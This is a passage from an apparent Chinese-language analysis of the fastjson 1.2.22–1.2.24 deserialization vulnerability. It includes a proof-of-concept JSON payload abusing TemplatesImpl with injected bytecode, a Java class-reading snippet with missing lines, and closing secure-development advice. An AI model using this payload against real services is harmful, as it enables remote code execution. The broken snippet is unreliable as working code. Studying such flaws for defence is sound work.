private byte[] getClassFileBytes(String classFile) throws IOException, IOException {
        FileInputStream fis = new FileInputStream(classFile);
        FileChannel fileChannel = fis.getChannel();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        WritableByteChannel outC = Channels.newChannel(baos);
        ByteBuffer buffer = ByteBuffer.allocateDirect(1024);

            }
            buffer.flip();
            outC.write(buffer);
            buffer.clear();
        }
        fis.close();

    transientдҝ®йҘ°з¬ҰжҳҜиҜҙиҜҘжҲҗе‘ҳеҖјдёҚеҸ—еәҸеҲ—еҢ–е’ҢеҸҚеәҸеҲ—еҢ–зҡ„еҪұе“ҚпјҢдёәй»ҳи®ӨеҖјгҖӮдҪҶжҳҜtransientдҝ®йҘ°з¬Ұд»…еҜ№javaиҮӘиә«зҡ„еәҸеҲ—еҢ–еҸҚеәҸеҲ—еҢ–жңәеҲ¶жңүж•ҲпјҢеҜ№fastjsonзҡ„жңәеҲ¶ж— ж•ҲгҖӮжӯӨеӨ„transientиЎЁзӨәдәҶ_tfactoryд»…йңҖд»Јз Ғе®ҡд№үзҡ„й»ҳи®ӨеҖјеҚіеҸҜпјҢдҝ®ж”№жӯӨеҖјеҜ№зЁӢеәҸиҝҗиЎҢжІЎжңүзӣҙжҺҘеҪұе“ҚгҖӮ

    и·ҹиҝӣTransformerFactoryImplзұ»еһӢпјҢзЎ®и®ӨжҲҗе‘ҳж–№жі•дёӯеӯҳеңЁgetExternalExtensionsMap()гҖӮ

    еӣ жӯӨпјҢжҲ‘д»¬еңЁpayloadдёӯеҜ№_tfactoryеҸҳйҮҸдј е…Ҙ{}еҚіеҸҜдҪҝpayloadзҡ„жү§иЎҢжӯЈеёёгҖӮ

    payloadдҝ®ж”№еҰӮдёӢпјҡ

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
    String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"<EvilClass.classзҡ„base64зј–з Ғ>\"], \"_name\":\"\", \"_tfactory\":{},\"_outputProperties\":{}}";
    JSON.parseObject(payload, Feature.SupportNonPublicField);
}

    иҝҗиЎҢпјҢжҲҗеҠҹжү§иЎҢPOCгҖӮ

    4.4 жјҸжҙһйЈҺйҷ©

    ж”№жјҸжҙһеңЁfastjsonзүҲжң¬еңЁ[1.2.22, 1.2.24]дёӯеӯҳеңЁпјҢеҰӮжһңд»Јз Ғдёӯи®ҫзҪ®еҜ№SupportNonPublicFieldеҸҚеәҸеҲ—еҢ–з§ҒжңүеҸҳйҮҸзҡ„ж”ҜжҢҒпјҢдё”еӯҳеңЁfastjson.JSON.parse()жҲ–fastjson.JSON.parseObject()зӣҙжҺҘжҺҘеҸ—еӨ–йғЁjsonж•°жҚ®зҡ„жғ…жҷҜпјҢиҜҘжҺҘеҸЈеӯҳеңЁйЈҺйҷ©гҖӮ

    5 еҜ№ејҖеҸ‘е®үе…Ёзҡ„еҗҜзӨә

    жң¬ж¬ЎжјҸжҙһзҡ„ж №жң¬еҺҹеӣ жҳҜз”ұдәҺTemplatesImplзұ»дёӯйҮҚеҶҷдәҶclassLoaderзұ»пјҢдҪҶжІЎжңүеҶҷи®ҝй—®дҝ®йҘ°з¬ҰйҷҗеҲ¶пјҢеҜјиҮҙйҮҚеҶҷеҗҺзҡ„defineClassж–№жі•й»ҳи®ӨжҳҜdefaultеұһжҖ§пјҢеҸҜд»Ҙиў«еҗҢеҢ…е…¶д»–зұ»гҖҒж–№жі•и®ҝй—®пјҢдә§з”ҹдәҶи°ғз”Ёй“ҫгҖӮ

    еҜ№ејҖеҸ‘е®үе…Ёзҡ„еҗҜзӨәпјҡ

    1.йҮҚеҶҷclassLoaderзұ»еёёи§ҒдәҺеҸҚеәҸеҲ—еҢ–еҠҹиғҪзҡ„е®һзҺ°пјҢеҸҚеәҸеҲ—еҢ–дјҙйҡҸзқҖе®үе…ЁйҡҗжӮЈпјҢйңҖиҰҒж…ҺйҮҚеҜ№еҫ…гҖӮе»әи®®дҪҝз”ЁдёҘж јзҡ„и®ҝй—®дҝ®йҘ°з¬ҰйҷҗеҲ¶йҮҚеҶҷпјҢеҮҸе°Ҹиў«йқһйў„жңҹи°ғз”Ёзҡ„жҡҙйңІйқўпјӣ
2.fastjsonзҡ„1зүҲжң¬е®ҳж–№е·ІдёҚеҶҚиҝӣиЎҢж”ҜжҢҒпјҢе»әи®®дҪҝз”Ёfastjson2з»„д»¶пјӣ
